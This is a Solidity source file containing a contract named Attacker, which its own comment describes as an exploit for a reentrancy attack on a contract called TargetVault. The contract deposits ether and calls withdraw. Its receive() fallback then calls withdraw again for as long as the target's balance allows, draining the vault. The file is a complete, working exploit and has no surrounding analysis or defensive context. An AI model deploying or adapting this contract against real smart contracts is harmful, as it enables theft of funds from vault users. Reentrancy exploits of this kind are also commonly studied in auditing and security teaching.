// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface ITargetVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title Attacker
 * @dev An exploit contract designed to execute a reentrancy attack on TargetVault.
 */
contract Attacker {
    ITargetVault public target;
    uint256 public withdrawAmount;
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _targetAddress) {
        target = ITargetVault(_targetAddress);
        owner = msg.sender;
    }

    function depositToTarget() external payable onlyOwner {
        target.deposit{value: msg.value}();
    }

    function attack(uint256 _amount) external onlyOwner {
        withdrawAmount = _amount;
        target.withdraw(_amount);
    }

    // Fallback function that executes the reentrancy loop
    receive() external payable {
        if (address(target).balance >= withdrawAmount) {
            target.withdraw(withdrawAmount);
        }
    }
}
